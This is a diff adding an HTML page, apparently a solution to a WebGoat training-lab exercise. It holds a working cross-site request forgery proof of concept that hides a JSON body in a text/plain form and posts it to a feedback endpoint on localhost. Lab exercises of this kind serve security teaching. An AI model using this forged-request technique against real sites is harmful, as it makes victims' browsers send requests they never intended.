@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <title>XSRF Attack</title>
+</head>
+<body>
+<form enctype="text/plain" action="http://localhost:8080/WebGoat/csrf/feedback/message" method="post">
+    <input type="submit"  value="Run">
+    <input type="hidden">
+</form>
+
+<script>
+ window.addEventListener('load', () => {
+     const form = document.querySelector("form");
+     const input = document.querySelector("input[type='hidden']");
+        const json = {
+            "name": "WebGoat",
+            "email": "webgoat@webgoat.org",
+            "content": "WebGoat is the best!!"
+        };
+        const string = JSON.stringify(json);
+        input.name = string.substring(0, string.length - 2);
+        input.value = '"}';
+    });
+</script>
+    
+</body>
+</html>
